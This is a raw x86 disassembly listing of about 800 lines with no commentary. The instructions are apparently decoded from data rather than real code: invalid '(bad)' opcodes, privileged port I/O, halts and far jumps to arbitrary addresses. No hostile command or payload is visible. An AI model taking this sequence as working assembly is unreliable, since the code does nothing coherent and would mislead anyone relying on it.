  490e85:	loop   0x490e34
  490e87:	in     eax,0xc0
  490e89:	xchg   edi,eax
  490e8a:	add    BYTE PTR [edx+esi*2],al
  490e8d:	stc    
  490e8e:	mov    dh,0xf1
  490e90:	inc    ebx
  490e91:	mov    al,0x1
  490e93:	les    esp,FWORD PTR [ebx+0x3199b320]
  490e99:	mov    ds:0x45e266ac,eax
  490e9e:	jl     0x490e39
  490ea0:	adc    BYTE PTR [esi],bh
  490ea2:	push   edi
  490ea3:	and    DWORD PTR [ecx+0x4127dc0a],esi
  490ea9:	xlat   BYTE PTR ds:[ebx]
  490eaa:	(bad)  
  490eab:	retf   
  490eac:	sub    BYTE PTR [eax+0x39bbfbac],ah
  490eb2:	lar    ecx,WORD PTR [esi+0xb2d3de5]
  490eb9:	jne    0x490ee5
  490ebb:	mov    ebx,0x28dbb8af
  490ec0:	jbe    0x490f14
  490ec2:	lahf   
  490ec3:	and    al,0xf0
  490ec5:	push   ebp
  490ec6:	int    0xf8
  490ec8:	add    ebx,0xf055352
  490ece:	push   edi
  490ecf:	js     0x490ee3
  490ed1:	push   esi
  490ed2:	popf   
  490ed3:	inc    ebx
  490ed4:	xor    eax,DWORD PTR ds:0x263e753
  490eda:	or     al,0xf1
  490edc:	mov    edi,0x2d6f66d7
  490ee1:	pop    ecx
  490ee2:	cmp    DWORD PTR [eax],0xde534454
  490ee8:	jne    0x1c2211de
  490eee:	and    edx,DWORD PTR [edi-0x1fa9b303]
  490ef4:	pop    ds
  490ef5:	adc    al,0x5e
  490ef7:	dec    ecx
  490ef8:	or     DWORD PTR [ebx+0x5f9cba7b],ebx
  490efe:	mov    ds:0x88b808c7,eax
  490f03:	fdiv   QWORD PTR [edx]
  490f05:	(bad)
  490f08:	dec    ebp
  490f09:	adc    DWORD PTR [ecx*1-0x1a794cbe],esp
  490f10:	push   cs
  490f11:	out    dx,al
  490f12:	push   0x33f14098
  490f17:	call   0x7c54:0x11fb0539
  490f1e:	dec    eax
  490f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490f20:	lea    esp,[ebx-0x7a2fa0f]
  490f26:	loope  0x490f5e
  490f28:	jo     0x490f4c
  490f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490f2b:	add    esi,DWORD PTR [ebp-0x6f]
  490f2e:	mov    bh,0x21
  490f30:	inc    ecx
  490f31:	aaa    
  490f32:	sbb    dl,BYTE PTR [ebp+0x8]
  490f35:	imul   ecx,DWORD PTR [ebp-0x7d],0x3d85e14b
  490f3c:	xor    eax,0x18f219b9
  490f41:	cli    
  490f42:	xchg   ebp,eax
  490f43:	fmul   QWORD PTR [ecx+0x8]
  490f46:	(bad)  
  490f47:	inc    DWORD PTR ds:0xe3a0e408
  490f4d:	pop    edx
  490f4e:	xor    eax,0x82f233db
  490f54:	mov    BYTE PTR [edi+edx*1],dh
  490f57:	mov    gs,eax
  490f59:	sbb    BYTE PTR [ebx*8+0x33c99445],ah
  490f60:	sti    
  490f61:	es dec ebp
  490f63:	shr    cl,cl
  490f65:	ret    0x219b
  490f68:	jmp    0x4877:0x485caab9
  490f6f:	sub    ebp,edx
  490f71:	push   eax
  490f72:	shl    BYTE PTR ds:0xd807012f,0x5
  490f79:	in     eax,dx
  490f7a:	sub    al,0xe9
  490f7c:	xchg   esi,eax
  490f7d:	mov    esp,0x4c69e65
  490f82:	cmp    al,0x0
  490f84:	sbb    eax,0x57b3f7cf
  490f89:	mov    ecx,0x53c6e109
  490f8e:	cmp    eax,0x42420173
  490f93:	dec    eax
  490f94:	add    eax,0x26785d31
  490f99:	jo     0x490f75
  490f9b:	rcr    BYTE PTR [edi-0x1f],0xb9
  490f9f:	mov    dh,0x42
  490fa1:	inc    edx
  490fa2:	gs dec edi
  490fa4:	or     ch,cl
  490fa6:	pop    esp
  490fa7:	sbb    DWORD PTR cs:[edi],esi
  490faa:	or     al,0x8
  490fac:	ja     0x490f8e
  490fae:	adc    al,0xab
  490fb0:	aad    0xc6
  490fb2:	cmp    eax,0x85865859
  490fb7:	call   0xc199:0xfb20fc10
  490fbe:	or     al,BYTE PTR [esi]
  490fc0:	xchg   BYTE PTR [ebp+0x77d80a7],ch
  490fc6:	dec    ecx
  490fc7:	and    DWORD PTR [ecx],0xc70368d5
  490fcd:	sbb    DWORD PTR [esp+ecx*4-0x59],ebx
  490fd1:	clc    
  490fd2:	aam    0xa3
  490fd4:	jne    0x491011
  490fd6:	test   BYTE PTR [ebx+eax*4+0x4181cd18],ah
  490fdd:	lods   eax,DWORD PTR ds:[esi]
  490fde:	dec    ebp
  490fdf:	ins    DWORD PTR es:[edi],dx
  490fe0:	cmp    ebx,esi
  490fe2:	test   BYTE PTR [edi],ch
  490fe4:	loopne 0x491057
  490fe6:	jno    0x491062
  490fe8:	sub    al,0x6d
  490fea:	push   0x3bb7b047
  490fef:	retf   0x734e
  490ff2:	jmp    0x491068
  490ff4:	arpl   cx,bx
  490ff6:	sub    eax,0xb23063eb
  490ffb:	mov    esi,0xa1ec7d61
  491000:	inc    esp
  491001:	or     eax,0x86051d37
  491006:	(bad)  
  491007:	out    0xb4,eax
  491009:	gs jmp 0x49104d
  49100c:	ret    
  49100d:	mov    BYTE PTR [ebp+edi*1-0x72d5da17],0xc3
  491015:	push   es
  491016:	outs   dx,BYTE PTR ds:[esi]
  491017:	rcr    DWORD PTR [ebx+ebx*1],cl
  49101a:	inc    esp
  49101b:	add    al,0xdd
  49101d:	add    al,0x34
  49101f:	and    al,0xb8
  491021:	xchg   esp,eax
  491022:	mov    bl,BYTE PTR [ecx]
  491024:	dec    esi
  491025:	arpl   WORD PTR [ebx],si
  491027:	push   edi
  491028:	cmc    
  491029:	adc    eax,0x36428815
  49102e:	mov    edi,0xa14ff999
  491033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491034:	das    
  491035:	jbe    0x49109a
  491037:	ins    BYTE PTR es:[edi],dx
  491038:	je     0x49109f
  49103a:	jae    0x4910b0
  49103c:	xor    eax,DWORD PTR [esi+edx*4]
  49103f:	xor    DWORD PTR es:[edx],ebp
  491042:	xchg   ebp,eax
  491043:	ss pop eax
  491045:	jmp    0xe34b:0x3ad17252
  49104c:	inc    eax
  49104d:	sub    BYTE PTR [eax+0x558d3937],0x2
  491054:	(bad)  
  491055:	or     al,0x91
  491057:	xchg   DWORD PTR [esi+0x43a787e2],ebp
  49105d:	pop    ds
  49105e:	cwde   
  49105f:	adc    DWORD PTR [esi],esi
  491061:	outs   dx,BYTE PTR ds:[esi]
  491062:	(bad)  
  491063:	sub    ebp,DWORD PTR [esi+0xc6530e7]
  491069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49106a:	into   
  49106b:	std    
  49106c:	pop    ebp
  49106d:	call   0xdb1fca92
  491072:	mov    al,0x43
  491074:	inc    esp
  491075:	mov    ch,0x4e
  491077:	adc    BYTE PTR [edi],ah
  491079:	xchg   BYTE PTR [edi+edx*8+0x6a3c74f8],al
  491080:	cmp    BYTE PTR [ebx+0x44],dh
  491083:	sbb    dh,BYTE PTR [esi]
  491085:	idiv   BYTE PTR [ebp+0x3d]
  491088:	inc    esp
  491089:	push   es
  49108a:	inc    eax
  49108b:	push   eax
  49108c:	dec    ecx
  49108d:	xchg   edi,eax
  49108e:	mov    eax,0x5198fc2a
  491093:	xchg   edi,eax
  491094:	push   0xc9f543fd
  491099:	pop    ebp
  49109a:	inc    ebx
  49109b:	inc    esp
  49109c:	test   eax,0x4135c91f
  4910a1:	jl     0x491065
  4910a3:	int3   
  4910a4:	or     al,0x1
  4910a6:	add    al,0x29
  4910a8:	es test bh,ah
  4910ab:	test   BYTE PTR [eax],0x96
  4910ae:	cmp    BYTE PTR [edx],cl
  4910b0:	pop    edi
  4910b1:	test   BYTE PTR [ecx+edx*2-0x66f66dc8],dh
  4910b8:	cmp    BYTE PTR [ecx],ch
  4910ba:	pop    ss
  4910bb:	pusha  
  4910bc:	leave  
  4910bd:	xchg   ebp,eax
  4910be:	xor    al,0x7
  4910c0:	icebp  
  4910c1:	or     ebp,edx
  4910c3:	push   esi
  4910c4:	or     esi,0xffffff99
  4910c7:	add    cl,BYTE PTR [ebx]
  4910c9:	and    eax,0x82370978
  4910ce:	mov    ebp,0xcad1cad8
  4910d3:	mov    eax,0xb15ef00
  4910d8:	xadd   eax,ecx
  4910db:	mov    eax,0xa49bf33d
  4910e0:	cmp    BYTE PTR [ecx],dh
  4910e2:	add    al,0xf4
  4910e4:	rcr    DWORD PTR [eax+0x70f3c0bf],0x8
  4910eb:	ret    0x7aa0
  4910ee:	test   BYTE PTR ds:0x58297851,0x70
  4910f5:	vshufps ymm5,ymm0,YMMWORD PTR [ebx],0x5f
  4910fa:	push   edx
  4910fb:	push   es
  4910fc:	adc    bh,BYTE PTR ds:0x68531f66
  491102:	sub    DWORD PTR [ecx],ecx
  491104:	add    DWORD PTR [esi+0x63],edx
  491107:	pop    ecx
  491108:	xchg   ebx,eax
  491109:	aaa    
  49110a:	mov    ch,0x10
  49110c:	push   esi
  49110d:	push   edi
  49110e:	sub    DWORD PTR [ecx],edx
  491110:	sbb    al,dl
  491112:	pop    eax
  491113:	mov    edi,0x6f24fa87
  491118:	adc    eax,0xa46b2017
  49111d:	outs   dx,BYTE PTR ds:[esi]
  49111e:	rcr    BYTE PTR [edx],1
  491120:	mov    dl,0xaf
  491122:	loopne 0x4910ed
  491124:	mov    bh,0xae
  491126:	push   ecx
  491127:	popa   
  491128:	or     eax,0xe9538ce8
  49112d:	adc    al,BYTE PTR [ebp-0x58fca049]
  491133:	ja     0x491132
  491135:	mov    esi,DWORD PTR [ebx-0x14a87acb]
  49113b:	sub    ch,ch
  49113d:	mov    DWORD PTR [ebx+0x59],ebp
  491140:	aas    
  491141:	fadd   DWORD PTR [edi-0x26]
  491144:	push   0x3a692368
  491149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49114a:	sbb    eax,DWORD PTR [eax]
  49114c:	cld    
  49114d:	jmp    0x491151
  49114f:	jne    0x491182
  491151:	or     ebp,DWORD PTR [esp+ebp*2-0x80]
  491155:	xchg   ecx,eax
  491156:	cmp    DWORD PTR [edx],eax
  491158:	pop    ss
  491159:	in     al,dx
  49115a:	cmp    BYTE PTR [edx+0x687b46d5],0x1d
  491161:	adc    ebp,DWORD PTR [eax-0x7a]
  491164:	iret   
  491165:	inc    eax
  491166:	sub    ch,BYTE PTR [edx]
  491168:	in     eax,dx
  491169:	pop    ebp
  49116a:	add    BYTE PTR [ebx+0x5e020a17],bl
  491170:	sbb    dl,bh
  491172:	inc    esi
  491173:	popa   
  491174:	test   DWORD PTR [eax],0x820f91f8
  49117a:	sar    BYTE PTR ds:0x8e871508,1
  491180:	and    BYTE PTR [edx],al
  491182:	stos   DWORD PTR es:[edi],eax
  491183:	inc    ebp
  491184:	dec    ebp
  491185:	mov    ecx,0x4af0dc5b
  49118a:	jne    0x4911da
  49118c:	mov    eax,DWORD PTR cs:[edi+0x17]
  491190:	sbb    DWORD PTR [ebx],edi
  491192:	test   al,0x9d
  491194:	push   0xbc507b70
  491199:	shl    DWORD PTR [esi],0xeb
  49119c:	sbb    eax,0x2560cb55
  4911a1:	mov    WORD PTR [ebx+0xb],fs
  4911a4:	pop    ds
  4911a5:	jae    0x4911bf
  4911a7:	jecxz  0x491165
  4911a9:	mov    bh,0x75
  4911ab:	add    al,0x60
  4911ad:	jmp    0x1a25141a
  4911b2:	(bad)  
  4911b3:	lock and ecx,0x5
  4911b7:	jp     0x491209
  4911b9:	push   ebp
  4911ba:	pop    ebx
  4911bb:	fcmovb st,st(4)
  4911bd:	outs   dx,BYTE PTR ds:[esi]
  4911be:	cmp    DWORD PTR [ecx+0x6a],edx
  4911c1:	cli    
  4911c2:	sub    esi,esi
  4911c4:	dec    ecx
  4911c5:	jg     0x491242
  4911c7:	enter  0x53b,0x8
  4911cb:	jne    0x4911ea
  4911cd:	pop    ebp
  4911ce:	or     BYTE PTR [ebp+0x78],cl
  4911d1:	dec    eax
  4911d2:	rol    DWORD PTR [edi-0x13f0f32c],1
  4911d8:	cli    
  4911d9:	fisubr WORD PTR [esi-0x4b]
  4911dc:	test   BYTE PTR [ecx+0x17],bl
  4911df:	test   DWORD PTR [ebx-0x1d],esp
  4911e2:	or     al,0x15
  4911e4:	xchg   ecx,eax
  4911e5:	fsub   st(5),st
  4911e7:	and    BYTE PTR [ebp+0x43],ch
  4911ea:	cmp    eax,0x38639682
  4911ef:	mov    dl,0x80
  4911f1:	sbb    esp,DWORD PTR [edi-0x16]
  4911f4:	xchg   edx,esi
  4911f6:	pop    ebp
  4911f7:	xor    al,0x1e
  4911fa:	scas   eax,DWORD PTR es:[edi]
  4911fb:	int3   
  4911fc:	mov    edx,ebp
  4911fe:	add    al,0xc2
  491200:	fistp  DWORD PTR [eax+0x10]
  491203:	pushf  
  491204:	test   al,0x37
  491206:	popa   
  491207:	mov    esp,ebp
  491209:	inc    edi
  49120b:	add    esp,esp
  49120d:	mov    eax,0x5612cf89
  491212:	loop   0x491261
  491214:	xchg   esp,eax
  491215:	inc    esi
  491216:	adc    cl,BYTE PTR [eax+0x6b]
  491219:	outs   dx,DWORD PTR ds:[esi]
  49121a:	dec    esp
  49121b:	or     al,0x36
  49121d:	xchg   edi,eax
  49121e:	push   ecx
  49121f:	fld    DWORD PTR [ebx-0x3f]
  491222:	cmp    eax,0xd50320a9
  491227:	or     BYTE PTR [eax],al
  491229:	int3   
  49122a:	inc    ecx
  49122b:	mov    eax,0x93077588
  491230:	daa    
  491231:	mov    eax,0x66741244
  491236:	or     eax,0x7e00dabe
  49123b:	xchg   BYTE PTR [eax+0xa],al
  49123e:	jmp    0xb1d8:0x96ff7706
  491245:	mov    esp,0xf50e783d
  49124a:	mov    BYTE PTR [edx+0x27],0x3c
  49124e:	and    eax,0xe4f320f1
  491253:	sbb    esi,esi
  491255:	das    
  491256:	sbb    DWORD PTR [eax+0x22],esi
  491259:	lock cld 
  49125b:	adc    cl,BYTE PTR [edx-0x45]
  49125e:	fst    QWORD PTR ds:0xb085dd3
  491264:	pop    eax
  491265:	clc    
  491266:	hlt    
  491267:	inc    ecx
  491268:	cmp    al,0x78
  49126a:	call   0x8303:0x55a6edf
  491271:	int3   
  491272:	pop    edi
  491273:	in     al,0xf2
  491275:	and    eax,0xef66eb15
  49127a:	sbb    ebp,edi
  49127c:	adc    bl,BYTE PTR [edi+eiz*2]
  49127f:	mov    edx,0xa48740d0
  491284:	std    
  491285:	xor    eax,0x184e8d40
  49128a:	and    bl,BYTE PTR [ebx+0x38]
  49128d:	xchg   BYTE PTR [edi+0x20905294],dh
  491293:	test   BYTE PTR [ebx+0x54],0x59
  491297:	mov    eax,0x995c8c86
  49129c:	inc    ebx
  49129d:	jecxz  0x4912d1
  49129f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4912a0:	dec    ebx
  4912a1:	and    DWORD PTR [ebx+edx*4-0x77bca722],0xa397202f
  4912ac:	pop    ebp
  4912ad:	push   edi
  4912ae:	mov    ebp,0x46600169
  4912b3:	and    BYTE PTR [edx],dh
  4912b5:	push   esi
  4912b6:	int    0x48
  4912b8:	xchg   ebx,eax
  4912b9:	cmp    dh,BYTE PTR [esi+0x28]
  4912bc:	lods   eax,DWORD PTR ds:[esi]
  4912bd:	jecxz  0x49124b
  4912bf:	sbb    al,0x42
  4912c1:	(bad)  
  4912c2:	dec    esi
  4912c3:	cmc    
  4912c4:	mov    dh,0x27
  4912c6:	add    DWORD PTR [ebp-0x4f],edi
  4912c9:	ins    BYTE PTR es:[edi],dx
  4912ca:	fwait
  4912cb:	or     al,0x75
  4912cd:	sbb    al,0xb4
  4912cf:	dec    ebx
  4912d0:	popa   
  4912d1:	mov    bl,0x17
  4912d3:	out    0x63,eax
  4912d5:	xor    dh,BYTE PTR [ecx]
  4912d7:	xchg   ecx,eax
  4912d8:	test   al,0x31
  4912da:	mov    ebx,0xdc7e26c6
  4912df:	pop    edi
  4912e0:	push   ebx
  4912e1:	mov    eax,ds:0x42427194
  4912e6:	xchg   esp,eax
  4912e7:	jnp    0x49127d
  4912e9:	ficomp WORD PTR ds:0x1085b015
  4912ef:	sbb    al,0x3d
  4912f1:	inc    edi
  4912f2:	mov    BYTE PTR [edi],dh
  4912f4:	add    eax,0xe4ba75ed
  4912f9:	pop    es
  4912fa:	adc    al,bh
  4912fc:	or     eax,0x4c64018
  491301:	inc    ebp
  491302:	adc    al,0x20
  491304:	and    DWORD PTR [ecx],edx
  491306:	je     0x491351
  491308:	repz add ch,bh
  49130b:	shr    DWORD PTR [ebx+ebx*2],cl
  49130e:	push   ss
  49130f:	call   0x107949b7
  491314:	daa    
  491315:	cmp    DWORD PTR [esi+0x44],0x1c
  491319:	pop    edi
  49131a:	inc    esp
  49131b:	(bad)  
  49131c:	mov    dl,0xab
  49131e:	or     al,0x8b
  491320:	sti    
  491321:	rcl    DWORD PTR [ebx+0x38ecb2b1],0x89
  491328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49132a:	xlat   BYTE PTR ds:[ebx]
  49132b:	xchg   ecx,eax
  49132c:	xchg   ebp,eax
  49132d:	add    al,BYTE PTR [edx+0x4]
  491330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491331:	add    BYTE PTR [eax],cl
  491333:	icebp  
  491334:	jnp    0x49131a
  491336:	out    0x5,al
  491338:	inc    ebp
  491339:	mov    eax,0x6f897394
  49133e:	mov    bh,al
  491340:	sbb    cl,BYTE PTR ds:0xbaa1d79a
  491346:	clc    
  491347:	lea    edx,[edx]
  491349:	fbld   TBYTE PTR [edx+0xeba2df1]
  49134f:	mov    eax,0x1c3b0110
  491354:	pusha  
  491355:	jl     0x4913c0
  491357:	or     al,0xb2
  491359:	add    dl,BYTE PTR [eax+0x5dec04f5]
  49135f:	pop    esi
  491360:	xchg   edi,eax
  491361:	and    BYTE PTR [ecx-0x3c],dh
  491364:	pop    ebx
  491365:	lea    ebx,[ebx]
  491367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491368:	or     dl,bh
  49136a:	push   eax
  49136b:	add    edx,eax
  49136d:	nop
  49136e:	pop    es
  49136f:	iret   
  491370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491371:	aam    0xad
  491373:	add    eax,0xbc268971
  491378:	mov    ecx,0xe3189360
  49137d:	mov    al,0x70
  49137f:	mov    ch,0xc3
  491381:	mov    edi,0x580a5405
  491386:	jo     0x491312
  491388:	xchg   ecx,eax
  491389:	fstp   DWORD PTR ds:0xb78ca950
  49138f:	mov    bh,0x28
  491391:	or     DWORD PTR [edi+0x58],0x57c87958
  491398:	add    BYTE PTR [edx],0xd
  49139b:	rol    BYTE PTR [ecx+0x10],1
  49139e:	mov    dh,0x8b
  4913a0:	enter  0x464d,0x27
  4913a4:	push   edi
  4913a5:	jns    0x49141c
  4913a7:	popf   
  4913a8:	popf   
  4913a9:	inc    ebx
  4913aa:	(bad)  
  4913ab:	rol    BYTE PTR [eax],cl
  4913ad:	pop    ss
  4913ae:	cmp    edx,DWORD PTR [esi]
  4913b0:	test   BYTE PTR [edi+0x3278a81],ah
  4913b6:	fldpi  
  4913b8:	adc    eax,0xab2d22eb
  4913bd:	hlt    
  4913be:	in     eax,dx
  4913bf:	mov    ah,0xf7
  4913c2:	mov    eax,0x2d50e421
  4913c7:	pop    edx
  4913c8:	inc    ecx
  4913c9:	pop    edi
  4913ca:	push   es
  4913cb:	mov    ah,0x13
  4913cd:	outs   dx,DWORD PTR ds:[esi]
  4913ce:	and    BYTE PTR [esi],0x69
  4913d1:	sub    al,0xa7
  4913d3:	lods   al,BYTE PTR ds:[esi]
  4913d4:	pop    ebp
  4913d5:	add    edi,ebx
  4913d7:	sub    BYTE PTR [esi-0x7],0xf4
  4913db:	ds hlt 
  4913dd:	dec    ebx
  4913de:	pushf  
  4913df:	ss inc edx
  4913e1:	cmp    esp,DWORD PTR [edx]
  4913e3:	in     al,dx
  4913e4:	sbb    edi,DWORD PTR [edi]
  4913e6:	or     al,al
  4913e8:	mov    ch,0x29
  4913ea:	call   0x43a9889e
  4913ef:	sbb    eax,DWORD PTR [edi-0x1e]
  4913f2:	mov    DWORD PTR [ebp-0x44],0x18c81a1a
  4913f9:	and    esi,DWORD PTR [ecx+0x24]
  4913fc:	and    DWORD PTR [edi-0x779c93fc],esi
  491402:	ins    DWORD PTR es:[edi],dx
  491403:	pop    es
  491404:	pop    ds
  491405:	mov    cs,WORD PTR ds:0xc0f51de3
  49140b:	les    ebp,FWORD PTR [ebx]
  49140d:	add    ecx,DWORD PTR ds:0xd1cae135
  491413:	stc    
  491414:	and    al,0xd1
  491416:	outs   dx,BYTE PTR ds:[esi]
  491417:	hlt    
  491418:	inc    esp
  491419:	add    DWORD PTR [esi],ebp
  49141b:	mov    ds:0xd5b4c028,al
  491420:	loope  0x491444
  491422:	aad    0x3
  491424:	shl    BYTE PTR [edx],1
  491426:	outs   dx,DWORD PTR ds:[esi]
  491427:	inc    ebx
  491428:	sub    BYTE PTR [eax],dl
  49142a:	stos   BYTE PTR es:[edi],al
  49142b:	or     ch,dl
  49142d:	lock push es
  49142f:	xchg   ebp,eax
  491430:	adc    DWORD PTR [ebx],esp
  491432:	in     al,0x91
  491434:	rol    BYTE PTR [ebx+0x48],0x4e
  491438:	xor    eax,0x100010ce
  49143d:	and    bh,BYTE PTR [edi]
  49143f:	push   ecx
  491440:	test   ch,ch
  491442:	pop    es
  491443:	inc    ebp
  491444:	test   eax,0xd8c9c4e3
  491449:	jnp    0x4913eb
  49144b:	jo     0x49140e
  49144d:	pop    ebp
  49144e:	and    eax,0x7148f49b
  491453:	cmp    ch,cl
  491455:	test   BYTE PTR [ebx+eax*2],dh
  491458:	and    DWORD PTR [eax-0x7b534b50],edi
  49145e:	inc    ebx
  49145f:	dec    eax
  491460:	and    DWORD PTR [eax+0xa132725],ebx
  491466:	shl    esp,cl
  491468:	in     al,0x61
  49146a:	and    cl,0xc4
  49146d:	lahf   
  49146e:	sbb    al,0xeb
  491470:	push   es
  491471:	imul   eax,DWORD PTR [ecx],0xf8f83710
  491477:	sbb    eax,0xbb40f915
  49147c:	or     BYTE PTR [ebp-0x67],al
  49147f:	add    al,0x1e
  491481:	ret    
  491482:	or     DWORD PTR [eax],edx
  491484:	jns    0x4914fa
  491486:	in     eax,dx
  491487:	and    DWORD PTR [ecx-0x68],ebp
  49148a:	pop    ss
  49148b:	xchg   esp,eax
  49148c:	ja     0x4914de
  49148e:	int    0xc4
  491490:	out    dx,eax
  491491:	into   
  491492:	push   cs
  491493:	and    DWORD PTR [edx*1+0x1e6cc8ba],edi
  49149a:	pop    ds
  49149b:	push   esp
  49149c:	jbe    0x49141e
  49149e:	xchg   edi,eax
  49149f:	pop    ebx
  4914a0:	dec    edx
  4914a1:	sub    eax,0x6a4508d4
  4914a6:	adc    BYTE PTR [ebp-0x40],bl
  4914a9:	das    
  4914aa:	scas   al,BYTE PTR es:[edi]
  4914ab:	lods   eax,DWORD PTR ds:[esi]
  4914ac:	stc    
  4914ad:	lock mov al,0x8b
  4914b0:	inc    ebp
  4914b1:	lea    ecx,[esi]
  4914b3:	fadd   st(4),st
  4914b5:	cmp    BYTE PTR [edi],dh
  4914b7:	ret    
  4914b8:	pop    ecx
  4914b9:	mov    ecx,0xc3cd94
  4914be:	adc    cl,al
  4914c0:	ret    0x4508
  4914c3:	clc    
  4914c4:	adc    dl,BYTE PTR [edx+0x2e01241e]
  4914ca:	xchg   ebp,eax
  4914cb:	add    eax,DWORD PTR es:[ebx+0x3d0987d7]
  4914d2:	mov    al,0x36
  4914d4:	ins    BYTE PTR es:[edi],dx
  4914d5:	sub    BYTE PTR [ecx],al
  4914d7:	and    BYTE PTR [edi+eax*4-0x73efa911],al
  4914de:	bound  eax,QWORD PTR [ecx-0x33]
  4914e1:	push   0x76aa9c28
  4914e6:	dec    eax
  4914e7:	sbb    DWORD PTR ds:0x563b1eed,ebx
  4914ed:	jle    0x49153a
  4914ef:	or     al,0x19
  4914f1:	ds je  0x49147b
  4914f4:	lods   al,BYTE PTR ds:[esi]
  4914f5:	add    cl,dl
  4914f7:	cld    
  4914f8:	xor    al,0x56
  4914fa:	xchg   edi,eax
  4914fb:	test   al,0xd2
  4914fd:	loope  0x491541
  4914ff:	sub    dh,BYTE PTR [edi-0xd41b1da]
  491505:	add    BYTE PTR [esi+eax*4],bl
  491508:	mov    esp,0x7f201d33
  49150d:	xchg   esi,eax
  49150e:	dec    esi
  49150f:	mov    ds:0x2d70d22c,al
  491514:	add    DWORD PTR [edi-0x783f2efb],ebx
  49151a:	pusha  
  49151b:	cld    
  49151c:	xchg   DWORD PTR [ebp-0x8],esp
  49151f:	data16 test al,0x14
  491522:	inc    ebx
  491523:	retf   
  491524:	sbb    al,BYTE PTR [edx]
  491526:	addr16 push cs
  491528:	fsubr  QWORD PTR [ebx-0x35]
  49152b:	adc    BYTE PTR [edx+esi*4],al
  49152e:	inc    ecx
  49152f:	fwait
  491530:	jne    0x491545
  491532:	fadd   DWORD PTR [ebp-0x1b]
  491535:	mov    al,BYTE PTR [eax]
  491537:	bound  edx,QWORD PTR [eax]
  491539:	fsubr  DWORD PTR [ecx-0x5f]
  49153c:	popf   
  49153d:	fidiv  WORD PTR [edi+0x3c5e1680]
  491543:	sbb    esp,DWORD PTR [edi]
  491545:	sbb    DWORD PTR [eax+eax*4+0x4a53e615],edi
  49154c:	pop    es
  49154d:	dec    ebx
  49154e:	xchg   edi,eax
  49154f:	and    al,0xa4
  491551:	jge    0x491572
  491553:	ret    
  491554:	shl    BYTE PTR [esi],1
  491556:	mov    eax,0x46464d8f
  49155b:	dec    esp
  49155c:	mov    BYTE PTR [edx],al
  49155e:	adc    al,0x3c
  491560:	addr16 fs pop edi
  491563:	hlt    
  491564:	push   eax
  491565:	aam    0xc8
  491567:	mov    BYTE PTR [ecx],0xf2
  49156a:	outs   dx,BYTE PTR ds:[esi]
  49156b:	sbb    BYTE PTR [ebx-0x37],bh
  49156e:	rcr    DWORD PTR [esi-0x2c],1
  491571:	jg     0x4915b0
  491573:	dec    esi
  491574:	push   eax
  491575:	jns    0x4915d8
  491577:	jl     0x49157a
  491579:	pop    es
  49157a:	and    bh,BYTE PTR [edi-0x1dc112d5]
  491580:	fs pushf 
  491582:	movzx  ecx,WORD PTR [ebx]
  491585:	push   0xc24e2e1f
  49158a:	dec    edx
  49158b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49158c:	inc    esi
  49158d:	sub    DWORD PTR [edi],esi
  49158f:	clc    
  491590:	push   ss
  491591:	mov    ah,0xb4
  491593:	pop    ecx
  491594:	mov    BYTE PTR [ecx],0x1
  491597:	mov    ebx,DWORD PTR ds:0x7e258691
  49159d:	mov    ch,0x73
  49159f:	push   0x1fbeb48e
  4915a4:	sbb    cl,BYTE PTR [edx-0x2c]
  4915a7:	adc    eax,0xa3861151
  4915ac:	xchg   esi,eax
  4915ad:	xor    al,0x23
  4915af:	add    al,0x2d
  4915b1:	xchg   edx,eax
  4915b2:	push   esi
  4915b3:	inc    esp
  4915b4:	pop    esi
  4915b5:	jbe    0x49155b
  4915b7:	loope  0x491567
  4915b9:	mov    ebx,0x55215119
  4915be:	loop   0x491565
  4915c0:	or     BYTE PTR [edx],dl
  4915c2:	sub    DWORD PTR [esi],ebx
  4915c4:	ret    0xcc18
  4915c7:	push   edx
  4915c8:	sub    ah,bh
  4915ca:	daa    
  4915cb:	add    al,0xf9
  4915cd:	es inc ecx
  4915cf:	shl    DWORD PTR ds:0x40d8450b,cl
  4915d5:	or     BYTE PTR [edi+0x7d],dh
  4915d8:	lea    ebp,[esi-0x48]
  4915db:	add    ah,BYTE PTR [esi-0x61f07bca]
  4915e1:	cli    
  4915e2:	cmp    al,0x4f
  4915e4:	sub    dh,BYTE PTR [eax*1+0x26ae000d]
  4915eb:	cmc    
  4915ec:	sbb    DWORD PTR [ebx],eax
  4915ee:	inc    edx
  4915ef:	aas    
  4915f0:	mov    bl,0x56
  4915f2:	sbb    ecx,DWORD PTR [eax]
  4915f4:	test   al,0x7d
  4915f6:	sbb    ch,BYTE PTR [ebx]
  4915f8:	push   ecx
  4915f9:	xor    esp,0x70
  4915fc:	add    al,0xea
  4915fe:	push   es
  4915ff:	or     al,BYTE PTR [ecx]
  491601:	sub    al,0xb2
  491603:	dec    esp
  491604:	adc    BYTE PTR [eax+edi*4+0x64ae1f87],ch
  49160b:	or     DWORD PTR ds:0x10b20c86,0xe480001
  491615:	sub    dl,BYTE PTR fs:[eax]
  491618:	mov    ch,0x8b
  49161a:	or     al,0xf
  49161c:	sbb    eax,0xcf6fc08b
  491621:	ror    BYTE PTR ds:0x4c6867d4,1
  491627:	sbb    eax,0xa63a07e8
  49162c:	mov    al,BYTE PTR [eax+0x3f50924b]
  491632:	dec    ecx
  491633:	loopne 0x4916ae
  491635:	add    ecx,DWORD PTR [ebp-0x1c]
  491638:	and    ah,dh
  49163a:	push   es
  49163b:	sahf   
  49163c:	lods   eax,DWORD PTR ds:[esi]
  49163d:	std    
  49163e:	mov    BYTE PTR [esp+ebp*1+0x36],ch
  491642:	or     DWORD PTR [eax],ecx
  491644:	cld    
  491645:	mov    al,ds:0x93035ce1
  49164a:	mov    al,ds:0x13ebc415
  49164f:	adc    edx,DWORD PTR [edi-0x21da9dff]
  491655:	sbb    DWORD PTR [edi+0x5e5c9614],ecx
  49165b:	jge    0x49162d
  49165d:	ror    BYTE PTR [edx+edi*4+0xa],0x11
  491662:	lock and DWORD PTR [edi+0x6d2033c3],esp
  491669:	push   ebp
